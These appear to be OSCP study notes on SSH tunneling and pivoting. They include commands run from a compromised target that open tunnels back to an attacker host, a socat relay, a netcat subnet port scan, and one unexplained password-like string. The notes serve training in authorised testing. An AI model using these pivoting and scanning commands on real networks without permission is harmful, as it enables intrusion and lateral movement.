---
aliases:
  - Port Forwarding
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - linux
  - ssh
  - ssh_tunneling
  - port_redirection
  - ssh_port_forwarding
  - port_forwarding
author: Mehdi N Tehrani
creat_date: 2024-01-03
category: Cyber Security
subcategory: Offensive Security - OSCP
---
# References
[Tunneling Protocols](https://en.wikipedia.org/wiki/Tunneling_protocol)
[SSH](https://man.openbsd.org/ssh#L)
[TTY](https://en.wikipedia.org/wiki/TTY)

# SSH Local Port Forwarding
#local 
Consider a scenario we have a reverse shell on a *target* machine *VM1* (first target), behind that there is *VM2* on another subnet, and *VM3* on yet another subnet (end target). We want to connect to **VM3 on a certain port** from the *attacker* machine. 

SSH local port forwarding, allows us to:
- SSH from VM1 to VM2
- Listen on VM1 on a port, and redirect it to **VM3 on desired port**
Attacker can now interact with VM1 on the listening port, just as if it's connecting to VM3 on its listening port.

Command on target machine (VM1 - Confluence01):
```sh
ssh -N -L 0.0.0.0:<target_lport>:<dst_ip>:<dst_port> <user>@<target_ip>
     ^ no shell
        ^ listen
```

![[Pasted image 20240103170737.png]]
#### netcat port scanning
#netcat #nc #port_scanning #enumeration 
```sh
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

# SSH Dynamic Port Forwarding
#local #dynamic
This allows attacker to access all ports on the end target

SSH dynamic port forwarding works because the listening port that the SSH client creates is a [SOCKS](https://en.wikipedia.org/wiki/SOCKS) proxy server port.

1. On closest target:
```sh
ssh -N -D 0.0.0.0:<lport> <user>@<target_2_ip>
```
2. On attacker machine update `/etc/proxychains.conf`
```
socks5 <target1_ip> <lport>
```
3. On attacker machine:
```sh
proxychains <command>
```

![[Pasted image 20240103175453.png]]

# SSH Remote Port Forwarding
#remote 
SSH from the *closest target* to *attacker* machine and **open a local port on attacker machine**, from which attacker can interact with the *end target*.

1. Start ssh service
```sh
sudo systemctl start ssh
```
2. Connect from closest target to attacker
```
ssh -N -R 127.0.0.1:<port_on_attacker>:<end_target>:<port> <attacker_user>@<attacker_ip>
```
- This opens `<local_port>` on the attacker machine from which we can interact with the end target

![[Pasted image 20240103182907.png]]

`D@t4basePassw0rd!`
# SSH Remote Dynamic Port Forwarding
#remote #dynamic 
Creates a dynamic port forward in the the closest target. The attacker runs an ssh server and its local SOCKS proxy port is bound to the SSH server, which forwards traffic from the SSH client.

1. on the closest target:
```sh
ssh -N -R <port_on_attacker> <attacker_user>@<attacker_ip>
```
2. On attacker machine update `/etc/proxychains.conf`
```
socks5 127.0.0.1 <lport>
```
3. On attacker machine:
```sh
proxychains <command>
```


![[Pasted image 20240103185023.png]]


# sshuttle
#sshuttle
[sshuttle GitHub](https://github.com/sshuttle/sshuttle)
In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage. *sshuttle* is a tool that turns an SSH connection into something *similar to a VPN* by setting up local routes that force traffic through the SSH tunnel. However, it requires *root privileges on the SSH client* and *Python3 on the SSH server*.

Consider a scenario where we have reverse shell from our closest target VM1. 
1. set up port forward to target 2 for SSH access:
```sh
socat TCP-LISTEN:2222,fork TCP:<target2_ip>:22
```
2. on attacker machine use sshuttle to connect to target 2 via SSH and access the network of the 3rd target:
```
sshuttle -r <target2_usr>@<target1_ip>:2222 <subnet_to_access> <subnet_to_access>
```
Now should be able to access devices on the specified subnets

